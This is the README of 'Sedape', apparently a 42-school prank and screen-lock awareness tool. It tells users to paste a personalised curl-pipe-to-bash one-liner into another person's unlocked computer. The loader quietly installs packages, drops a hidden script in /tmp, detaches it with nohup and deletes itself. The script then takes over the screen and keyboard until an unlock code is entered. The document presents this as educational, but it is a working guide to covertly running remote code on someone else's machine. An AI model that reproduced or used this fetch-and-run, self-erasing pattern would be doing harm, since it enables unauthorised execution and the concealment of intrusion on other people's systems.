# Sedape System 🍜
*Created as part of the 42 curriculum by traomeli.*

## What is this?

**Sedape** is a security awareness tool built for the 42 school community.

If you leave your workstation unlocked and walk away, someone might **sedape** you — your screen gets taken over with a full-screen warning image. To get your PC back, you need to find the person who did it and ask for the unlock code.

It sounds like a prank. It is. But it also teaches you to **always lock your screen**.

---

## How it works

```
curl -sL nary14.pythonanywhere.com/s/<username> | bash
         │
         ▼
   loader.sh runs silently
         │
         ├── pip3 install Pillow qrcode  (silent)
         ├── downloads croisant_lock.py into /tmp (hidden filename)
         ├── launches it with nohup (survives terminal close)
         └── self-destructs (rm -- "$0")

croisant_lock.py  ──POST──▶  /api/request_lock     (registers the lock, gets a token)
                  ◀──JSON──  { "token": "a3f9bc12" }
                  ──GET───▶  /gen_image/<token>      (downloads image with QR code)
                  ──poll──▶  /api/status/<token>     (loops every 2s waiting for unlock)

Victim scans QR   ──GET───▶  /unlock/<token>         (awareness page)
                  ──POST──▶  enters name + code       (unlocks the PC)
                  ◀──────── script detects status=1, releases screen
                             script deletes image + deletes itself
```

---

## If you got sedaped

Your screen is now locked fullscreen. Here is what to do:

1. **Grab your phone** and scan the QR code displayed on your screen
2. You will land on a webpage — read it, it will explain why this happened
3. Scroll down and click **UNLOCK**
4. Enter the **name** of the person who sedaped you and their **unlock code**
5. If you don't know who did it — look around, they are probably watching 😄
6. Once the correct name and code are entered, your screen unlocks automatically

> **Emergency exit (for testing only):** press **F8** ten times in a row

---

## If you want to sedape someone

### Step 1 — Create your account

Go to **https://nary14.pythonanywhere.com** and click **"Se connecter avec mon compte 42"**.

You will be redirected to the 42 intranet to authenticate. No password is stored on Sedape — authentication is handled entirely by the official 42 OAuth2 system.

Once logged in, your profile is created automatically with:
- Your **42 login** and **profile picture** pulled from the intranet
- Your **role** detected from your 42 titles:
  - `TUTOR` — if you have the Tutor title on the intranet
  - `STAFF` — if you are marked as staff or bocal on the intranet
  - `RANDOM GUY AT 42` — everyone else
- A default **unlock code** of `4242` (change it in settings)

### Step 2 — Configure your account

In your dashboard, go to **Settings** and:
- Change your **display name** — this is what appears on the victim's screen
- Change your **unlock code** — the victim will need this to unlock their PC

### Step 3 — Get your command

Your personalized one-liner is ready to copy directly from the dashboard:

```bash
curl -sL nary14.pythonanywhere.com/s/<your_username> | bash
```

This single command does everything silently and leaves no trace.

### Step 4 — Run it on the target machine

Wait for the person to leave their PC unlocked. Open a terminal and paste the command.

What happens next:
- Pillow and qrcode get installed silently in the background
- A hidden script is downloaded to `/tmp` with a randomized filename
- It launches detached from the terminal via `nohup` — closing the terminal changes nothing
- The bash loader self-destructs immediately after launching the script
- The script contacts the server, registers a new lock session, and gets a unique token
- It downloads a personalized image with your name and a QR code
- The screen goes fullscreen and captures all keyboard input

### Step 5 — Wait

Once the victim scans the QR, reads the awareness page, and enters your name and unlock code correctly — their screen unlocks automatically.

After unlock:
- The lock image is deleted from the victim's machine
- The script deletes itself
- Zero trace left on disk

You will see the status change to **LIBÉRÉ** on your dashboard.

---

## Dashboard

Everything is managed from **https://nary14.pythonanywhere.com**

| Section | What it does |
|---|---|
| Profile card | Shows your 42 login, profile picture, unlock code, role, and active lock count |
| Stats | Total sedapes, blocked vs unlocked |
| Command | Your one-liner `curl \| bash` ready to copy |
| Script download | Direct download of your pre-configured `.py` script (if Pillow is already installed) |
| PC list | All your lock sessions with token, status, and timestamp |
| Preview | Live preview of what your sedape screen looks like |
| Settings | Change your display name and unlock code |

---

## Features

- **42 OAuth2 login** — no account creation, log in with your 42 intranet credentials
- **Auto role detection** — Tutor, Staff, or Random Guy, detected automatically from the intranet
- **One-liner bash loader** — single `curl | bash` command, no manual setup
- **Detached execution** — runs via `nohup`, survives terminal close
- **Zero trace** — bash loader self-destructs, python script self-destructs after unlock
- **Multi-user** — every person has their own account and isolated lock sessions
- **Unique tokens** — each sedape generates a separate token, no conflicts between victims
- **Dynamic image** — generated on the fly with your name and a unique QR code
- **Awareness page** — victim reads a proper explanation before they can unlock
- **Real-time dashboard** — track all your locked PCs with live status updates
- **Fullscreen + keyboard capture** — prevents easy bypass

---

## Security & Ethics

> This project is designed **for educational purposes only** within the 42 school culture.

- Only use this on 42 school machines, within the community
- The sedape is a friendly reminder, not a malicious attack
- Authentication is delegated to the official 42 OAuth2 system — no passwords stored
- Tokens are randomly generated per session, no sensitive data is stored
- The awareness page explains why screen locking matters before the victim can unlock

For real system-level locking: **Super+L** on Linux, **Win+L** on Windows, **Cmd+Ctrl+Q** on Mac.

---

**🔒 Lock your screen. Always. Even for 30 seconds.**
